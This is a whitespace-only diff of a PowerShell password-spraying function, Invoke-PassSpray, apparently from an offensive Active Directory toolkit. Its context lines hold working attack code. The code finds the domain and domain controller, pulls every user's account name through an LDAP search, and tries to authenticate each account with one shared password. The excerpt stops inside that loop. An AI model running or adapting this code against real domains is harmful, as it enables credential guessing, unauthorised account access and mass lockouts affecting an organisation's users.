@@ -19,13 +19,13 @@ function Invoke-PassSpray {
 		[string]
         $DomainController
     )
-	
+
 	if(!$Domain){
 		$Domain = $env:USERDNSDOMAIN
 		if(!$Domain){$Domain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
 	 	if(!$Domain){$Domain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
 	}
-	
+
 	if(!$DomainController){
 		$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)))
 		$domainControllers = $currentDomain.DomainControllers
@@ -55,11 +55,11 @@ function Invoke-PassSpray {
 	$objSearcher.PageSize = 1000
 	$AllUsers = $objSearcher.FindAll() | ForEach-Object { $_.properties.samaccountname }
 	$AllUsers = $AllUsers | Sort-Object -Unique
-	
+
 	$KeepTrack = $False
  	$LDAPPath = "LDAP://"
     	$LDAPPath += $Domain
-     	
+
 	foreach($usr in $AllUsers){
 		try {
 		        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAPPath, $usr, $Password)
